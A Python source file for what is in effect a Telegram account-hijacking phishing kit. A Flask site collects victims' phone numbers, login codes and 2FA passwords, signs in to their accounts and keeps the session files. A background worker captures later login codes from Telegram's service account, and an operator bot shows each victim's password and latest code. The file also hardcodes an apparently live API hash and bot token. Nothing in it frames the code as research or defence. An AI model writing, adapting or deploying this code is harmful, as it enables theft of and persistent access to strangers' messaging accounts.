import os
import re
import asyncio
import threading
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError

# Telegram Bot Library
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")

# ========== KONFIG ==========
api_id = int(os.getenv("API_ID", 16047851))   # ganti sesuai API ID kamu
api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")  # ganti
BOT_TOKEN = os.getenv("BOT_TOKEN", "8205641352:AAHxt3LgmDdfKag-NPQUY4WYOIXsul680Hw")  # ganti

# Pakai folder tmp supaya aman di Railway
SESSION_DIR = "/tmp/sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# ========== PENGGANTI DB (PAKAI DICT) ==========
USERS = {}  # contoh: { "628xxxx": {"otp": "12345", "password": "mypassword"} }

def save_user(phone, otp=None, password=None):
    if phone not in USERS:
        USERS[phone] = {"otp": None, "password": None}
    if otp:
        USERS[phone]["otp"] = otp
    if password:
        USERS[phone]["password"] = password

def get_user(phone):
    return USERS.get(phone)

def get_all_users():
    return list(USERS.keys())

# ====== Helper session files ======
def remove_session_files(phone_base: str):
    for fn in os.listdir(SESSION_DIR):
        if fn.startswith(f"{phone_base}."):
            try:
                os.remove(os.path.join(SESSION_DIR, fn))
            except Exception:
                pass

def finalize_pending_session(phone_base: str):
    for fn in os.listdir(SESSION_DIR):
        if fn.startswith(f"{phone_base}.pending"):
            src = os.path.join(SESSION_DIR, fn)
            dst = os.path.join(SESSION_DIR, fn.replace(".pending", ""))
            try:
                os.rename(src, dst)
            except Exception:
                pass

# ====== FLASK ROUTES ======
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        phone = request.form.get("phone", "").strip()
        if not phone:
            flash("Masukkan nomor telepon.", "error")
            return redirect(url_for("login"))

        session["phone"] = phone
        remove_session_files(phone)

        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def send_code():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            sent = await client.send_code_request(phone)
            session["phone_code_hash"] = sent.phone_code_hash
            await client.disconnect()

        try:
            asyncio.run(send_code())
            flash("OTP telah dikirim ke Telegram Anda.")
            return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Error kirim OTP: {e}", "error")
            return redirect(url_for("login"))
    return render_template("login.html")

@app.route("/otp", methods=["GET", "POST"])
def otp():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if request.method == "POST":
        code = request.form.get("otp", "").strip()
        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def verify_code():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=session["phone_code_hash"])
                finalize_pending_session(phone)
                save_user(phone, otp=code)
                await client.disconnect()
                return {"ok": True, "need_password": False}
            except SessionPasswordNeededError:
                await client.disconnect()
                return {"ok": True, "need_password": True}
            except PhoneCodeInvalidError:
                await client.disconnect()
                return {"ok": False, "error": "OTP salah"}

        res = asyncio.run(verify_code())
        if res["ok"]:
            if res.get("need_password"):
                session["need_password"] = True
                flash("Akun ini butuh password (2FA).", "info")
                return redirect(url_for("password"))
            else:
                flash("Login berhasil ✅", "success")
                return redirect(url_for("success"))
        else:
            flash(res.get("error", "Gagal verifikasi OTP"), "error")
            return redirect(url_for("otp"))
    return render_template("otp.html")

@app.route("/password", methods=["GET", "POST"])
def password():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if not session.get("need_password"):
        return redirect(url_for("success"))

    if request.method == "POST":
        password_input = request.form.get("password", "")
        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def verify_password():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            try:
                await client.sign_in(password=password_input)
                finalize_pending_session(phone)
                save_user(phone, password=password_input)
                await client.disconnect()
                return {"ok": True}
            except PasswordHashInvalidError:
                await client.disconnect()
                return {"ok": False, "error": "Password salah"}

        res = asyncio.run(verify_password())
        if res["ok"]:
            flash("Login berhasil ✅", "success")
            return redirect(url_for("success"))
        else:
            flash(res["error"], "error")
            return redirect(url_for("password"))
    return render_template("password.html")

@app.route("/success")
def success():
    return render_template("success.html", phone=session.get("phone"))

# ======= WORKER =======
async def forward_handler(event, client_name):
    text_msg = getattr(event, "raw_text", "")
    sender = await event.get_sender()
    if sender.id != 777000:
        return

    otp_match = re.findall(r"\b\d{4,6}\b", text_msg)
    if otp_match:
        otp_code = otp_match[0]
        save_user(client_name, otp=otp_code)

async def worker_main():
    clients = {}
    while True:
        for fn in os.listdir(SESSION_DIR):
            if not fn.endswith(".session") or ".pending" in fn:
                continue

            base = fn[:-len(".session")]
            if base in clients:
                continue

            client = TelegramClient(os.path.join(SESSION_DIR, base), api_id, api_hash)
            await client.connect()
            if not await client.is_user_authorized():
                await client.disconnect()
                continue

            @client.on(events.NewMessage)
            async def _handler(event, fn=base):
                await forward_handler(event, fn)

            clients[base] = client
            asyncio.create_task(client.run_until_disconnected())
        await asyncio.sleep(5)

def start_worker():
    threading.Thread(target=lambda: asyncio.run(worker_main()), daemon=True).start()

# ======= TELEGRAM BOT =======
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = get_all_users()
    if not users:
        await update.message.reply_text("Belum ada nomor yang login.")
        return

    for phone in users:
        keyboard = [
            [
                InlineKeyboardButton("Cek Password", callback_data=f"pass:{phone}"),
                InlineKeyboardButton("Cek OTP", callback_data=f"otp:{phone}"),
            ]
        ]
        await update.message.reply_text(
            f"📱 Nomor: {phone}", reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    cmd, phone = query.data.split(":")
    user = get_user(phone)
    if not user:
        await query.edit_message_text("Nomor tidak ditemukan.")
        return

    otp = user.get("otp")
    password = user.get("password")
    if cmd == "pass":
        if password:
            await query.edit_message_text(f"🔑 Password {phone}: {password}")
        else:
            await query.edit_message_text(f"ℹ️ Nomor {phone} tidak menggunakan password.")
    elif cmd == "otp":
        if otp:
            await query.edit_message_text(f"📩 OTP terakhir untuk {phone}: {otp}")
        else:
            await query.edit_message_text(f"⚠️ OTP belum tersedia untuk {phone}.")

def start_bot():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.run_polling()

# ======= MAIN =======
if __name__ == "__main__":
    start_worker()
    threading.Thread(target=start_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
